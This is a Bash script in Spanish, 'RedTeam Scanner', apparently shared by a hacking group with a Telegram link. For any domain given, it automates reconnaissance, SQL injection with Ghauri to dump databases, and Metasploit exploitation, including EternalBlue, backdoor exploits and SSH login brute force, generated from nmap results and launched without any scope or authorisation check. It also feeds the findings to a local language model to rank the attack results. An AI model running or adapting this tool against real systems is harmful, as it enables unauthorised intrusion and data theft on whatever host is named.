#!/bin/bash
# RedTeam Scanner v6 - Automate, Exploit & IA Report - 2025

set -o errexit
set -o pipefail
set -o nounset

target="${1:-}"
TIMEOUT_SECONDS=180
OUT_BASE="outputs"
TOOLS=("subfinder" "assetfinder" "dnsx" "naabu" "nmap" "httpx" "gau" "waybackurls" "dalfox" "nuclei" "ffuf" "ghauri")
OLLAMA_BIN="${OLLAMA_BIN:-$(command -v ollama || true)}"
GPT4ALL_BIN="${GPT4ALL_BIN:-$(command -v gpt4all || true)}"
LLAMACPP_BIN="${LLAMACPP_BIN:-$(command -v llama-cli || true)}"
OLLAMA_MODEL="${OLLAMA_MODEL:-}"

# Preparación
domain="$(echo "$target" | sed -E 's#https?://##' | sed 's#/.*##')"
outdir="${OUT_BASE}/${domain//\//_}"
aggregate="${outdir}/${domain}_aggregate.txt"
json_out="${outdir}/${domain}_summary.json"
mkdir -p "$outdir"

banner(){
  echo -e "\e[91m
╻ ╻┏━┓┏━╸╻┏ ╻┏┓╻┏━╸   ╺┳╸┏━╸┏━┓┏┳┓   ┏━┓┏━╸╺┳┓   ╺┳╸┏━╸┏━┓┏┳┓   ╻ ╻┏━┓
┣━┫┣━┫┃  ┣┻┓┃┃┗┫┃╺┓    ┃ ┣╸ ┣━┫┃┃┃   ┣┳┛┣╸  ┃┃    ┃ ┣╸ ┣━┫┃┃┃   ┃┏┛╺━┫
╹ ╹╹ ╹┗━╸╹ ╹╹╹ ╹┗━┛    ╹ ┗━╸╹ ╹╹ ╹   ╹┗╸┗━╸╺┻┛    ╹ ┗━╸╹ ╹╹ ╹   ┗┛ ┗━┛

   RedTeam Scanner v2 a v3 - Full Automation, Metasploit & RedTeam IA 

Telegram: https://t.me/+0hHSaKO7eI9mNWY8

Team:@makina50 @HombreM @P4b10hdr @Vixt0r24 @kdeahack @HackingTeamProHackers 
   
 RedTeam Scanner v3 - Full Automation, Metasploit & RedTeam IA  
\e[0m"
  echo "Objetivo: $domain"
  echo "Salida: $outdir"
  echo "──────────────────────────────────────────────"
}

log(){ echo -e "[$(date +%H:%M:%S)] $*" | tee -a "$aggregate"; }

_timeout_cmd(){
  if timeout --help 2>&1 | grep -q -- '--foreground'; then
    timeout --foreground "$@"
  else
    timeout "$@"
  fi
}

read -rp "¿Qué módulos ejecutar? [1]Recon [2]Ghauri [3]IA [4]Metasploit [5]Todos: " mod_choice

do_recon=false
do_ghauri=false
do_ai=false
do_msf=false

case $mod_choice in
  1) do_recon=true ;;
  2) do_ghauri=true ;;
  3) do_ai=true ;;
  4) do_msf=true ;;
  5) do_recon=true; do_ghauri=true; do_ai=true; do_msf=true ;;
  *) echo "Opción inválida"; exit 1 ;;
esac

check_tools(){
  for t in "${TOOLS[@]}"; do
    if ! command -v "$t" >/dev/null 2>&1; then
      log "[WARN] $t no encontrado. Se omite."
    fi
  done
}

run_tool(){
  local name="$1"
  local cmd="$2"
  local outfile="$3"
  log "[INFO] $name..."
  if _timeout_cmd "$TIMEOUT_SECONDS" bash -c "$cmd" >"$outfile" 2>>"$aggregate"; then
    log "[OK] $name → $outfile"
  else
    log "[WARN] $name falló o timeout"
  fi
}

scan_all(){
  run_tool "subfinder" "subfinder -d $domain -silent" "$outdir/subfinder.txt"
  run_tool "assetfinder" "assetfinder --subs-only $domain" "$outdir/assetfinder.txt"
  run_tool "dnsx" "echo $domain | dnsx -silent -a -aaaa -cname -resp" "$outdir/dnsx.txt"
  run_tool "naabu" "naabu -host $domain -rate 100 -silent" "$outdir/naabu.txt"
  run_tool "nmap" "nmap -Pn -sS --open -oG $outdir/nmap.grep -oN $outdir/nmap.txt $domain" "$outdir/nmap.txt"
  run_tool "httpx" "echo https://$domain | httpx -silent -title -status-code -content-length" "$outdir/httpx.txt"
  run_tool "gau" "gau $domain --subs" "$outdir/gau.txt"
  run_tool "waybackurls" "echo $domain | waybackurls" "$outdir/waybackurls.txt"
  run_tool "dalfox" "dalfox url https://$domain -S" "$outdir/dalfox.txt"
  run_tool "nuclei" "nuclei -u https://$domain -silent" "$outdir/nuclei.txt"
  run_tool "ffuf" "ffuf -u https://$domain/FUZZ -w /usr/share/wordlists/dirb/common.txt -t 40 -fc 404" "$outdir/ffuf.txt"
}

scan_ghauri(){
  local wayback_file="$outdir/waybackurls.txt"
  local ghauri_out="$outdir/ghauri.txt"
  if [ -s "$wayback_file" ]; then
    log "[INFO] Escaneando con Ghauri desde waybackurls.txt"
    while read -r url; do
      ghauri -u "$url" --dbs --random-agent --time-sec 10 --ignore-code 404 --force-ssl -p 100 >>"$ghauri_out" 2>>"$aggregate"
    done < <(head -n 20 "$wayback_file")
  else
    ghauri -u "https://$domain" --dbs --random-agent --time-sec 10 --ignore-code 404 --force-ssl -p 100 >"$ghauri_out" 2>>"$aggregate"
  fi
  log "[OK] Resultados Ghauri: $ghauri_out"
}

run_ai_local(){
  local nuc_file="$outdir/nuclei.txt"
  local ghauri_file="$outdir/ghauri.txt"
  local outfile="$outdir/ai_report.txt"
  local prompt="Eres un RedTeamer. Resume hallazgos (Nuclei, Ghauri), prioriza por criticidad, impacto y mitigación.\n\nDatos:\n$(cat "$nuc_file" 2>/dev/null)\n$(cat "$ghauri_file" 2>/dev/null)"
  if [ -n "$OLLAMA_BIN" ]; then
    OLLAMA_MODEL="${OLLAMA_MODEL:-$($OLLAMA_BIN list | awk 'NR==2{print $1}')}"
    printf "%s" "$prompt" | "$OLLAMA_BIN" run "$OLLAMA_MODEL" >"$outfile"
  elif [ -n "$GPT4ALL_BIN" ]; then
    echo "$prompt" | "$GPT4ALL_BIN" --model model.bin >"$outfile"
  elif [ -n "$LLAMACPP_BIN" ]; then
    "$LLAMACPP_BIN" -p "$prompt" >"$outfile"
  fi
  log "[OK] IA Reporte → $outfile"
}

generate_msf_resource(){
  local nmap_file="$outdir/nmap.grep"
  local msfrc="$outdir/msf_auto.rc"
  : > "$msfrc"
  log "[INFO] Analizando servicios para explotación..."
  grep -Eo '[0-9]+/(open|filtered)/tcp//[a-z0-9_\-]+' "$nmap_file" | while IFS=/ read -r port state proto _ service; do
    case "$service" in
      ftp)
        echo "use exploit/unix/ftp/vsftpd_234_backdoor" >> "$msfrc"
        ;;
      ssh)
        echo "use auxiliary/scanner/ssh/ssh_login" >> "$msfrc"
        ;;
      smtp)
        echo "use auxiliary/scanner/smtp/smtp_enum" >> "$msfrc"
        ;;
      http|http-proxy|http-alt)
        echo "use auxiliary/scanner/http/http_version" >> "$msfrc"
        echo "use auxiliary/scanner/http/dir_scanner" >> "$msfrc"
        echo "use exploit/windows/http/ms10_065_farpoint_web" >> "$msfrc"
        ;;
      smb|microsoft-ds|netbios-ssn)
        echo "use auxiliary/scanner/smb/smb_version" >> "$msfrc"
        echo "use exploit/windows/smb/ms17_010_eternalblue" >> "$msfrc"
        ;;
      mysql)
        echo "use auxiliary/scanner/mysql/mysql_version" >> "$msfrc"
        echo "use exploit/windows/mysql/mysql_yassl_getname" >> "$msfrc"
        ;;
      mssql)
        echo "use auxiliary/scanner/mssql/mssql_ping" >> "$msfrc"
        ;;
      redis)
        echo "use auxiliary/scanner/redis/redis_server" >> "$msfrc"
        ;;
      rdp)
        echo "use auxiliary/scanner/rdp/rdp_enum" >> "$msfrc"
        ;;
      telnet)
        echo "use auxiliary/scanner/telnet/telnet_version" >> "$msfrc"
        echo "use exploit/unix/telnet/kenwood_telnet_backdoor" >> "$msfrc"
        ;;
      vnc)
        echo "use auxiliary/scanner/vnc/vnc_none_auth" >> "$msfrc"
        ;;
      *)
        ;;
    esac
    # Seteos comunes
    echo "set RHOSTS $domain" >> "$msfrc"
    echo "set RPORT $port" >> "$msfrc"
    echo "run" >> "$msfrc"
  done
}

run_auto_msf(){
  generate_msf_resource
  log "[INFO] Lanzando Metasploit automatizado"
  msfconsole -q -r "$outdir/msf_auto.rc" | tee "$outdir/msf_auto.log"
  log "[OK] Explotación automatizada finalizada"
}

generate_json(){
  {
    echo "{"
    echo "  \"target\": \"$domain\","
    echo "  \"timestamp\": \"$(date '+%Y-%m-%d %H:%M:%S')\","
    echo "  \"nuclei_findings\": $(jq -Rs '.' "$outdir/nuclei.txt" 2>/dev/null || echo '\"N/A\"'),"
    echo "  \"ghauri_results\": $(jq -Rs '.' "$outdir/ghauri.txt" 2>/dev/null || echo '\"N/A\"'),"
    echo "  \"ai_summary\": $(jq -Rs '.' "$outdir/ai_report.txt" 2>/dev/null || echo '\"N/A\"'),"
    echo "  \"msf\": $(jq -Rs '.' "$outdir/msf_auto.log" 2>/dev/null || echo '\"N/A\"')"
    echo "}"
  } >"$json_out"
  log "[OK] JSON: $json_out"
}

# FLUJO PRINCIPAL
banner
check_tools
if $do_recon; then scan_all; fi
if $do_ghauri; then scan_ghauri; fi
if $do_ai; then run_ai_local; fi
if $do_msf; then run_auto_msf; fi
generate_json
log "Ejecución finalizada."
